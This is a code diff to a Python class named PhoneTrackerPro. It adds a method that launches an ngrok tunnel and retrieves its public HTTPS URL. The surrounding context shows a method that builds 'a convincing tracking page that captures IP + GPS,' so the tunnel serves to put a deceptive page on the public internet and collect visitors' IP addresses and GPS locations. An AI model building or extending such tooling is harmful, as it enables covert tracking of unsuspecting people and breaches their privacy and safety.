@@ -1181,6 +1181,42 @@ class PhoneTrackerPro:
         except:
             return "?.?.?.?"
 
+    def _launch_ngrok_tunnel(self, port=8888, timeout=15):
+        """Start ngrok in the background and return the public HTTPS URL."""
+        import shutil
+        if shutil.which("ngrok") is None:
+            return None
+
+        try:
+            ngrok_proc = subprocess.Popen(
+                ["ngrok", "http", str(port), "--log=stdout"],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+            )
+        except Exception:
+            return None
+
+        start = time.time()
+        public_url = None
+        while time.time() - start < timeout:
+            try:
+                resp = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=2)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    for t in data.get("tunnels", []):
+                        url = t.get("public_url", "")
+                        if url.startswith("https://"):
+                            public_url = url
+                            break
+                    if public_url:
+                        break
+            except Exception:
+                time.sleep(1)
+                continue
+
+        return {"process": ngrok_proc, "url": public_url}
+
     def _build_tracking_page(self, track_id):
         """Build a convincing tracking page that captures IP + GPS."""
         return f"""<!DOCTYPE html>
